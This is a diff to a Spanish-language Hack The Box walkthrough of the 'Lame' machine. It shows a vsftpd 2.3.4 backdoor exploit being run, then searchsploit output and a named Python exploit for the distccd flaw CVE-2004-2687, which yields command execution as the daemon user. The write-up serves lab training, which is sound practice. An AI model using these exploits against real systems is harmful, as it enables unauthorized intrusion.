@@ -136,4 +136,23 @@ root@rebcesp:/home/rebcesp/htb/Lame/exploits# python3 vsftpd_234_exploit.py 10.1
 [+] Triggered backdoor
 [*] Attempting to connect to backdoor...
 ```
+Al comprobar que no podemos acceder  por el puerto 21 con el exploit utilizado, probaremos con el puerto 3632, que esta utilizando un servicio distccd:
+
+> Distcc es un programa diseñado para distribuir tareas de compilación a través de la red hacia máquinas participantes. Consiste en un servidor, distccd y un programa cliente, distcc. Distcc puede trabajar de forma transparente con ccache, Portage y Automake realizando una sencilla configuración. 
+
+Vamos a usar la misma  metodología buscando en `searchsploit` algún exploit para  distccd y luego proceder a buscarlo el exploit en algun repositorio de  github u otra plataforma.
+
+```console
+root@rebcesp:/home/rebcesp/htb/Lame/exploits# searchsploit distcc
+--------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                 |  Path
+                                                               | (/usr/share/exploitdb/)
+--------------------------------------------------------------- ----------------------------------------
+DistCC Daemon - Command Execution (Metasploit)                 | exploits/multiple/remote/9915.rb
+--------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+```
+Encontramos el exploit en python `distccd_rce_CVE-2004-2687.py`.
+
+Si ejecutamos comandos arbitrarios por ejemplo `ifconfig` comprobamos que estamos en la máquina Lame pero con usuario de deamon, para  saber esto podrías ejecutar en vez de ifconfig `whoami`.
 
